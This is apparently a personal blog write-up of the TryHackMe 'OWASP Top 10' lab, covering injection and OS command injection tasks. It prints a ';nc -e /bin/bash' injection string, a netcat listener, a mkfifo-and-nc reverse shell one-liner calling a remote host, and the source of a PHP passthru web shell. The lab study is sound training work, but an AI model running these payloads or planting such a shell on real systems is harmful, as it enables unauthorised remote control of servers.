---
title: Writeup for TryHackMe room - OWASP Top 10
author: 4n3i5v74
date: 2021-02-10 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, owasp]
pin: false
---

## [OWASP Top 10](https://tryhackme.com/room/owasptop10){:target="_blank"}

This room contains info and exploits of Top 10 OWASP most critical vulnerabilities.


## Task 3 - [Severity 1] Injection

Injection is when user controlled input is interpreted as actual commands or parameters by the application.
- SQL Injection: This occurs when user controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries.
- Command Injection: This occurs when user input is passed to system commands. As a result, an attacker is able to execute arbitrary system commands on application servers.


## Task 4 - [Severity 1] OS Command injection

Use these links as references.
- [Reverse Shell Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md){:target="_blank"}

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.
- Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.
- Active command injection will return the response to the user

A simple `;nc -e /bin/bash` is enough to start a shell using command injection.


## Task 5 - [Severity 1] Command injection Practical

This task shows how php shells can be used to inject commands using server-side system calls.


Use these links as references.
- [PHP Passthru](https://www.php.net/manual/en/function.passthru.php){:target="_blank"}


Use `http://<ip>/evilshell.php` to access the php based web shell. Any linux commands can be executed, like `whoami`, `uname -a`, `id`, `ifconfig`, `ps -ef, or windows commands can be executed, like `whoami`, `ver`, `ipconfig`, `taslist`, `netstat -an`.

A reverse shell can also be spawned. A `netcat` listener can be spawned as below.
{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse shell.
{% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

The sample php shell code from `evilshell.php` is as below.
{% capture code %}{% raw %}<?php
  if (isset($_GET["commandString"])) {
    $command_string = $_GET["commandString"];
    try { passthru($command_string); }
    catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
  }
?>{% endraw %}{% endcapture %} {% include code.html code=code lang="bash"%}

To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.


## Task 6 - [Severity 2] Broken Authentication



